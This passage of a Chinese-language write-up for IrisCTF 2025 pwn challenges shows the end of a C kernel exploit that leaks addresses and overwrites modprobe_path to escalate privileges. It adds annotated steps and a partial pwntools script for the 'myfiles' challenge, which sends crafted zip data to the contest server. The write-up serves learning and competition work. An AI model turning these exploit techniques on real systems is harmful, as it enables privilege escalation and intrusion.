    <span class="n">write_iter</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>


    <span class="n">set_pos</span><span class="p">(</span><span class="mh">0x10000000000000000</span> <span class="o">-</span> <span class="n">tmp</span><span class="p">);</span>
    <span class="n">read_iter</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>


    <span class="kt">size_t</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1008e00</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">modprobe</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x1b3f100</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernl_base = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">kernel_base</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"modprobe = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modprobe</span><span class="p">);</span>


    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x100320</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"offset = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">offset</span><span class="p">);</span>


    <span class="kt">size_t</span> <span class="n">base_addr</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"base_addr = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">base_addr</span><span class="p">);</span>


    <span class="kt">size_t</span> <span class="n">modprobe_offset</span> <span class="o">=</span> <span class="n">modprobe</span> <span class="o">-</span> <span class="n">base_addr</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"modprobe_offset = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="n">modprobe_offset</span><span class="p">));</span>


    <span class="n">set_pos</span><span class="p">(</span><span class="n">modprobe_offset</span><span class="p">);</span>

    <span class="n">write_iter</span><span class="p">(</span><span class="s">"/tmp/e1</span><span class="se">\x00</span><span class="s">"</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>


    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>


    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>大概1/2 吧？</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/b9f1c1abbddc1bc78db8640b7c184896-20250106163709-9csu4ok.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/b9f1c1abbddc1bc78db8640b7c184896-20250106163709-9csu4ok.png" alt="b9f1c1abbddc1bc78db8640b7c184896" loading="lazy"></a>​</p>

<h3 id="exploit利用过程分析"><span class="me-2">exploit利用过程分析</span><a href="#exploit利用过程分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>将用户的数据 copy 到 kernel 里</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107150703-j7zuuoy.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107150703-j7zuuoy.png" alt="image" loading="lazy"></a>​</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="kt">size_t</span> <span class="nf">copy_from_iter</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">kernel_addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">bytes</span><span class="p">,</span> <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="n">user_iov_iter</span><span class="p">);</span>
<span class="k">struct</span> <span class="n">iov_iter</span> <span class="p">{</span>
	<span class="n">u8</span> <span class="n">iter_type</span><span class="p">;</span>
	<span class="n">bool</span> <span class="n">nofault</span><span class="p">;</span>
	<span class="n">bool</span> <span class="n">data_source</span><span class="p">;</span>  <span class="c1">// 0x10 : stack addr</span>
	<span class="kt">size_t</span> <span class="n">iov_offset</span><span class="p">;</span> <span class="c1">// 0x18 : length</span>
	<span class="p">....</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107150717-fos32v4.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107150717-fos32v4.png" alt="image" loading="lazy"></a>​</p>

<p>copy 后 可以看到， size处已经被覆盖成 big number</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107150731-met8ihq.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107150731-met8ihq.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>read 去读 泄露 heap_addr, 泄露heap 地址 后面后会用到</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107150746-odoftlm.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107150746-odoftlm.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>rest size （有重新改了一下size， 应该无所谓）</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151025-9320rdy.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151025-9320rdy.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151041-yoiln3o.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151041-yoiln3o.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151059-mjwrcdt.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151059-mjwrcdt.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>泄露地址 这里就需要利用 heap_addr 了</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="kt">size_t</span> <span class="n">kernel_in</span> <span class="o">=</span> <span class="mh">0xfffffe00000002e4</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">-</span> <span class="n">kernel_in</span><span class="p">;</span>
<span class="n">set_pos</span><span class="p">(</span><span class="mh">0x10000000000000000</span> <span class="o">-</span> <span class="n">tmp</span><span class="p">);</span>
<span class="n">read_iter</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>

<span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x100320</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
<span class="c1">// 泄露的 来的不一定是0x10032000000000，但是可以通过这个和泄露出来的值去做一个计算，就可以拿到 实际上 的 heap_addr的起始</span>
<span class="c1">// 从而 为后面寻找 modprobe_path 做更精确的计算</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107152304-i5dtm54.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107152304-i5dtm54.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>读数据</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151255-vp07x0w.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151255-vp07x0w.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151308-kn8qc3o.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151308-kn8qc3o.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>已经把数据放到 stack 了</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151328-hhr63qe.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151328-hhr63qe.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>有了 kernel vmlinux 的地址 ，就可以计算 modprobe_path 的地址了 然后就直接覆盖</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151344-rsla74r.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151344-rsla74r.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151356-1trvq9s.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151356-1trvq9s.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>pwn!</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151502-4l9mwd1.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107151502-4l9mwd1.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<blockquote>
  <p>都做完了我才想起来，可以直接覆盖 name 指针 设置成 modprobe_path, 然后直接修改，我上面是通过他们的偏移去算的，还麻烦一点，我傻逼了</p>
</blockquote>

<h2 id="myfiles"><span class="me-2">myfiles</span><a href="#myfiles" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<h3 id="分析-1"><span class="me-2">分析</span><a href="#分析-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>漏洞点， 如何 v6 是一个负数</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107153755-kctx7g2.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107153755-kctx7g2.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>调试查看</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107154148-xsu3wd1.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107154148-xsu3wd1.png" alt="image" loading="lazy"></a>​</p>

<p>每次计算 0x10 长度的 hash , 已知前面的 文件 <code class="language-plaintext highlighter-rouge">invitecode.txt</code>​ 后面两位 爆破即可</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107154221-2wkdewk.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107154221-2wkdewk.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107153415-av17j2d.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/image-20250107153415-av17j2d.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h3 id="exploit-1"><span class="me-2">exploit</span><a href="#exploit-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># from ctypes import CDLL
# cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
# imLZH1
</span><span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>  <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">lss</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s -&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>

<span class="n">attack</span> <span class="o">=</span> <span class="sh">'</span><span class="s">myfiles.chal.irisc.tf:10001</span><span class="sh">'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./chal</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span><span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">attack</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="nf">context</span><span class="p">(</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">,</span>
<span class="n">terminal</span><span class="o">=</span><span class="sh">'</span><span class="s">tmux splitw -h -l 170</span><span class="sh">'</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">.</span><span class="n">libc</span>
<span class="c1">#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')
</span>
<span class="c1">#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
</span>
<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
#continue
brva 0x023B7
brva 0x023F8
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>
<span class="c1">#pay = flat({
#},filler=b'\x00')
</span>

<span class="k">def</span> <span class="nf">listUser</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">listFiles</span><span class="p">(</span><span class="n">uid</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">id? </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">uid</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">createUser</span><span class="p">(</span><span class="n">unm</span><span class="p">,</span> <span class="n">pwd</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">code? </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">? </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">unm</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">? </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">uploadFile</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">zip_hex</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">to? </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">uid</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">file</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">zip_hex</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">viewFile</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">pwd</span><span class="p">,</span><span class="n">fid</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">? </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">uid</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">? </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">? </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">fid</span><span class="p">))</span>



<span class="kn">import</span> <span class="n">zipfile</span>
<span class="kn">import</span> <span class="n">io</span> <span class="k">as</span> <span class="n">io2</span>

<span class="k">def</span> <span class="nf">gen_zip</span><span class="p">(</span><span class="n">text</span><span class="p">,</span><span class="n">fname</span><span class="o">=</span><span class="sh">'</span><span class="s">text.txt</span><span class="sh">'</span><span class="p">):</span>
    <span class="n">zip_buffer</span> <span class="o">=</span> <span class="n">io2</span><span class="p">.</span><span class="nc">BytesIO</span><span class="p">()</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">zipfile</span><span class="p">.</span><span class="nc">ZipFile</span><span class="p">(</span><span class="n">zip_buffer</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">,</span> <span class="n">compression</span><span class="o">=</span><span class="n">zipfile</span><span class="p">.</span><span class="n">ZIP_STORED</span><span class="p">)</span>
    <span class="n">fd</span><span class="p">.</span><span class="nf">writestr</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
    <span class="n">zip_raw_data</span> <span class="o">=</span> <span class="n">zip_buffer</span><span class="p">.</span><span class="nf">getvalue</span><span class="p">()</span>
    <span class="n">zip_buffer</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">zip_raw_data</span><span class="p">.</span><span class="nf">hex</span><span class="p">())</span>
    <span class="k">return</span> <span class="n">zip_raw_data</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">fnv1a_hash</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="mh">0xCBF29CE484222325</span>
    <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x100000001B3</span> <span class="o">*</span> <span class="p">(</span><span class="n">byte</span> <span class="o">^</span> <span class="n">v5</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>  <span class="c1"># 64-bit mask
</span>    <span class="k">return</span> <span class="n">v5</span>

<span class="k">def</span> <span class="nf">gen_raw_zip</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">({</span>
        <span class="mh">0x00</span><span class="p">:</span><span class="nf">p32</span><span class="p">(</span><span class="mh">0x4034B50</span><span class="p">),</span>
        <span class="mh">0x08</span><span class="p">:</span><span class="nf">p16</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span> <span class="c1"># is encryp?
</span>        <span class="mh">0x12</span><span class="p">:</span><span class="nf">p32</span><span class="p">(</span><span class="mh">0x10</span><span class="p">),</span> <span class="c1"># text size
</span>        <span class="mh">0x1A</span><span class="p">:</span><span class="nf">p32</span><span class="p">(</span><span class="n">idx</span><span class="p">),</span> <span class="c1"># file name size 
</span>    <span class="p">},</span><span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
